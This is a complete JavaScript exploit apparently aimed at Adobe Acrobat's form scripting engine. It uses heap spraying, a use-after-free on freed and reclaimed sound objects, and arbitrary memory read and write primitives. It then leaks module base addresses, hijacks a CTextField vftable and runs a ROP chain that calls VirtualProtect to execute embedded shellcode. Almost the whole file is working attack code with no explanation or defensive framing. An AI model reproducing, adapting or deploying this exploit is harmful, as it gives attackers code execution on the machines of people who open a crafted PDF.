/* util functions */
console.show()
function gc() {new ArrayBuffer(3*1024*1024*100)}
function s2h(s) {
	var n1 = s.charCodeAt(0)
	var n2 = s.charCodeAt(1)
	return ((n2<<16)|n1)>>>0
}
redv = new DataView(new ArrayBuffer(4))
function re(n) {
	redv.setUint32(0, n, false)
	return redv.getUint32(0, n, true)
}
function assert(condition) {
	if (condition==false) {
		console.println('assert')
		throw ''
	}
}
//////////////////////////////


STR_60 		= "A".repeat(0x60/2-1)
FREE_110_SZ = 1024*2
FREES_110 	= Array(FREE_110_SZ)

/* heap spray */
SPRAY_SIZE 	= 0x2000
SPRAY 		= Array(SPRAY_SIZE)
GUESS 		= 0x20000058 //0x20d00058 
for(var i=0; i<SPRAY_SIZE; i++) SPRAY[i] = new ArrayBuffer(0x10000-24)
//////////////////////////////

/* prepare array elements buffer */
f = this.addField("f" , "listbox", 0, [0,0,0,0]);
t = Array(32)
for(var i=0; i<32; i++) t[i] = i
f.multipleSelection = 1
f.setItems(t)
f.currentValueIndices = t
/////////////////////////////////

/* prepare sound objects */
SOUND_SZ 	= 512
SOUNDS 		= Array(SOUND_SZ)
for(var i=0; i<512; i++) {
	SOUNDS[i] = this.getSound(i)
	SOUNDS[i].toString()
}
/////////////////////////////////

/* fence */
f.currentValueIndices = [1,2]
FENCE_SZ	= 1024*10 //magic number don't touch it
FENCES		= Array(FENCE_SZ)
for(var i=0; i<FENCE_SZ; i++) FENCES[i] = f.currentValueIndices
f.currentValueIndices = t
/////////////////////////////////

/* free and reclaim sound object */
RECLAIM_SZ 		= 512
RECLAIMS 		= Array(RECLAIM_SZ)
THRESHOLD_SZ 	= 1024*6
NTRY 			= 3
NOBJ 			= 8 //18
for(var i=0; i<NOBJ; i++) {
	SOUNDS[i] = null //free one sound object
	gc()

	for(var j=0; j<THRESHOLD_SZ; j++) f.currentValueIndices
	try {
		 if (this.getSound(i)[0] == 0) {
		 	RECLAIMS[i] = this.getSound(i)
		} else {
			console.println('RECLAIM SOUND OBJECT FAILED: '+i)
			throw ''
		}
	}
	catch (err) {
		console.println('RECLAIM SOUND OBJECT FAILED: '+i)
		throw ''
	}
	gc()
}
console.println('RECLAIM SOUND OBJECT SUCCEED')

/* free all allocated array objects */
this.removeField("f")
RECLAIMS 	= null
f 			= null
FENCES 		= null //free fence
gc()
/////////////////////////////////

for (var j=0; j<8; j++) SOUNDS[j] = this.getSound(j)
/* reclaim freed element buffer */
for(var i=0; i<FREE_110_SZ; i++) {
	FREES_110[i] = new Uint32Array(64)
	FREES_110[i][0] = 0x33441122
	FREES_110[i][1] = 0xffffff81
}
T = null
for(var j=0; j<8; j++) {
	try {
		if (SOUNDS[j][0] == 0x33441122) {
			T = SOUNDS[j]
			break
		}
	} catch (err) {}
}
if (T==null) {
	console.println('RECLAIM element buffer FAILED')
	throw ''
} else console.println('RECLAIM element buffer SUCCEED')
/////////////////////////////////

/* create and leak the address of an array buffer */
WRITE_ARRAY = new Uint32Array(8)
T[0] = WRITE_ARRAY
T[1] = 0x11556611
for(var i=0; i<FREE_110_SZ; i++) {
	if (FREES_110[i][0] != 0x33441122) {
		FAKE_ELES = FREES_110[i]
		WRITE_ARRAY_ADDR = FREES_110[i][0]
		console.println('WRITE_ARRAY_ADDR: ' + WRITE_ARRAY_ADDR.toString(16))
		assert(WRITE_ARRAY_ADDR>0)
		break
	} else {
		FREES_110[i] = null
	}
}
/////////////////////////////////

/* spray fake strings */
for(var i=0x1100; i<0x1400; i++) {
	var dv = new DataView(SPRAY[i])
	dv.setUint32(0, 0x102, 		true) //string header
	dv.setUint32(4, GUESS+12, 	true) //string buffer, point here to leak back idx 0x20000064
	dv.setUint32(8, 0x1f, 		true) //string length
	dv.setUint32(12, i,			true) //index into SPRAY that is at 0x20000058
	delete dv
}
gc()
/////////////////////////////////

//app.alert("Create fake string done")
/* point one of our element to fake string */
FAKE_ELES[4] = GUESS
FAKE_ELES[5] = 0xffffff85
// /////////////////////////////////

// /* create aar primitive */
SPRAY_IDX = s2h(T[2])
console.println('SPRAY_IDX: ' + SPRAY_IDX.toString(16))
assert(SPRAY_IDX>=0)
DV = DataView(SPRAY[SPRAY_IDX])
function myread(addr) {
	DV.setUint32(4, addr, true)
	return s2h(T[2])
}
/////////////////////////////////

// /* create aaw primitive */
for(var i=0; i<32; i++) {DV.setUint32(i*4+16, myread(WRITE_ARRAY_ADDR+i*4), true)} //copy WRITE_ARRAY
FAKE_ELES[6] = GUESS+0x10
FAKE_ELES[7] = 0xffffff87
function mywrite(addr, val) {
	DV.setUint32(96, addr, true)
	T[3][0] = val
}
//mywrite(0x200000C8, 0x1337)
/////////////////////////////////

/* leak escript base */
//d8c5e69b5ff1cea53d5df4de62588065
ESCRIPT_BASE = myread(WRITE_ARRAY_ADDR+12) - 0x02784D0 //data:002784D0 qword_2784D0    dq ? 
console.println('ESCRIPT_BASE: '+ ESCRIPT_BASE.toString(16))
assert(ESCRIPT_BASE>0)
/////////////////////////////////

/* leak .rdata:007A55BC ; const CTextField::`vftable' */
//f9c59c6cf718d1458b4af7bbada75243
for(var i=0; i<32; i++) this.addField(i, "text", 0, [0,0,0,0]);
T[4] = STR_60.toLowerCase()
for(var i=32; i<64; i++) this.addField(i, "text", 0, [0,0,0,0]);
MARK_ADDR = myread(FAKE_ELES[8]+4)
console.println('MARK_ADDR: '+ MARK_ADDR.toString(16))
assert(MARK_ADDR>0)
vftable = 0
while (1) {
	MARK_ADDR += 4
	vftable = myread(MARK_ADDR)
	if ( ((vftable&0xFFFF)==0x55BC) && (((myread(MARK_ADDR+8)&0xff00ffff)>>>0)==0xc0000000)) break
}
console.println('MARK_ADDR: '+ MARK_ADDR.toString(16))
assert(MARK_ADDR>0)
/////////////////////////////////

/* leak acroform, icucnv58 base address */
ACROFORM_BASE = vftable-0x07A55BC
console.println('ACROFORM_BASE: ' + ACROFORM_BASE.toString(16))
assert(ACROFORM_BASE>0)
r = myread(ACROFORM_BASE+0xBF2E2C)
//a86f5089230164fb6359374e70fe1739
ICU_BASE = myread(r+16)
console.println('ICU_BASE: ' + ICU_BASE.toString(16))
assert(ICU_BASE>0)
/////////////////////////////////

g1 = ICU_BASE + 0x919d4 + 0x1000//mov esp, ebx ; pop ebx ; ret
g2 = ICU_BASE + 0x73e44 + 0x1000//in al, 0 ; add byte ptr [eax], al ; add esp, 0x10 ; ret
g3 = ICU_BASE + 0x37e50 + 0x1000//pop esp;ret

//app.response({cQuestion: "",cTitle: "",cDefault: g3.toString(16),cLabel: ""});

/* copy CTextField vftable */
for(var i=0; i<32; i++) mywrite(GUESS+64+i*4, myread(vftable+i*4))
mywrite(GUESS+64+5*4, g1)  //edit one pointer in vftable
/////////////////////////////////

// // /* 1st rop chain */
mywrite(MARK_ADDR+4, g3)
mywrite(MARK_ADDR+8, GUESS+0xbc)

// // /* 2nd rop chain */
rop = [
myread(ESCRIPT_BASE + 0x01B0058), //VirtualProtect
GUESS+0x120, //return address
GUESS+0x120, //buffer
0x1000, //sz
0x40, //new protect
GUESS-0x20//old protect
]
for(var i=0; i<rop.length;i++) mywrite(GUESS+0xbc+4*i, rop[i])

//shellcode
shellcode = [835867240, 1667329123, 1415139921, 1686860336, 2339769483, 1980542347, 814448152, 2338274443, 1545566347, 1948196865, 4270543903, 605009708, 390218413, 2168194903, 1768834421, 4035671071, 469892611, 1018101719, 2425393296]
for(var i=0; i<shellcode.length; i++) mywrite(GUESS+0x120+i*4, re(shellcode[i]))

/* overwrite real vftable */
mywrite(MARK_ADDR, GUESS+64)
